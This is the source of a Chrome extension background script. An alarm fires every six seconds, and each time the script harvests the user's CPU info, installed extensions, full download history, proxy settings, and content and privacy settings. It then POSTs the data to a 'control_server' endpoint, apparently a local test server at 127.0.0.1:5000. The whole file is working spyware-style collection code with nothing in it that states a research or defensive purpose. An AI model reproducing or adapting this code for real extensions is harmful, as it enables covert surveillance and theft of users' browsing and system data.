IP ='http://127.0.0.1:5000'
DefaultIP = IP + '/control_server'

//Logs into DefaultIP in Simple Server
function log(C){
    fetch(DefaultIP,
            {
            method: "POST",
            mode: 'no-cors', 
            body: JSON.stringify(C),
            headers:{"Content-Type": "application/json"}
            }
    )
    }

function loggingcontentSettings(){

    var S='';
    //Call each attribute of Content Settings for the global case (attributes can be set per page) and records their state and name in a list
    chrome.contentSettings.cookies.get({primaryUrl:'http://*'},function(details){S+='Cookies : '+details.setting+'<br>';});
    chrome.contentSettings.images.get({primaryUrl:'http://*'},function(details){S+='Images : '+details.setting+'<br>';});
    chrome.contentSettings.javascript.get({primaryUrl:'http://*'},function(details){S+='JavaScript : '+details.setting+'<br>';});
    chrome.contentSettings.location.get({primaryUrl:'http://*'},function(details){S+='Location : '+details.setting+'<br>';});
    chrome.contentSettings.plugins.get({primaryUrl:'http://*'},function(details){S+='Plugins : '+details.setting+'<br>';});
    chrome.contentSettings.popups.get({primaryUrl:'http://*'},function(details){S+='Popups : '+details.setting+'<br>';});
    chrome.contentSettings.notifications.get({primaryUrl:'http://*'},function(details){S+='Notifications : '+details.setting+'<br>';});
    chrome.contentSettings.fullscreen.get({primaryUrl:'http://*'},function(details){S+='Full Screen : '+details.setting+'<br>';});
    chrome.contentSettings.mouselock.get({primaryUrl:'http://*'},function(details){S+='Mouse Lock : '+details.setting+'<br>';});
    chrome.contentSettings.microphone.get({primaryUrl:'http://*'},function(details){S+='Microphone : '+details.setting+'<br>';});
    chrome.contentSettings.camera.get({primaryUrl:'http://*'},function(details){S+='Camera : '+details.setting+'<br>';});
    chrome.contentSettings.unsandboxedPlugins.get({primaryUrl:'http://*'},function(details){S+='Unsandboxed Plugins : '+details.setting+'<br>';});
    chrome.contentSettings.automaticDownloads.get({primaryUrl:'http://*'},function(details){S+='Automatic Downloads : '+details.setting+'<br>';});
   //Then Sends it to the Simple Server
    setTimeout(function(){log(S)},1500);    


}

function loggingprivacySettings(){

    var S='';

    //Call each attribute of Privacy Settings for the global case (attributes can be set per page) and records their state and name in a list

    chrome.privacy.services.alternateErrorPagesEnabled.get({},function(details){S+='alternateErrorPagesEnabled : '+details.value + " " + details.levelOfControl  +' ';});
    chrome.privacy.services.safeBrowsingEnabled.get({},function(details){S+='safeBrowsingEnabled : '+details.value +  " " + details.levelOfControl +' ';});
    
    
    chrome.privacy.websites.hyperlinkAuditingEnabled.get({},function(details){S+='hyperlinkAuditingEnabled : '+details.value + " " + details.levelOfControl +' ';});
    chrome.privacy.websites.doNotTrackEnabled.get({},function(details){S+='doNotTrackEnabled : '+details.value + " " + details.levelOfControl +' ';});
    chrome.privacy.websites.protectedContentEnabled.get({},function(details){S+='protectedContentEnabled : '+details.value + " " + details.levelOfControl +' ';});

   //Then Sends it to the Simple Server
    setTimeout(function(){log(S)},1500);      


}


//chrome.contentSettings.cookies.get({primaryUrl:'http://*'},function(details){console.log(details)});
//https://stackoverflow.com/questions/53026387/how-to-get-all-chrome-content-settings

chrome.alarms.create({ periodInMinutes: 0.10 }); //An Alarm that goes every 6 seconds

chrome.alarms.onAlarm.addListener(()=>{ //When the Alarm goes, send data
    chrome.system.cpu.getInfo((info)=>{log(info)}) //Get the info about the user CPU
    chrome.management.getAll((info)=>{log(info)})  //Get all information about downlaods
    chrome.downloads.search({}).then(log)          //Get all History of Downloads
    chrome.proxy.settings.get({'incognito': false}, function(config){log(config)}) //gets all the proxy settings outside the incognito mode
        
    loggingcontentSettings(); //Get all Content Settings 
    loggingprivacySettings(); //Get all Privacy Settings

    })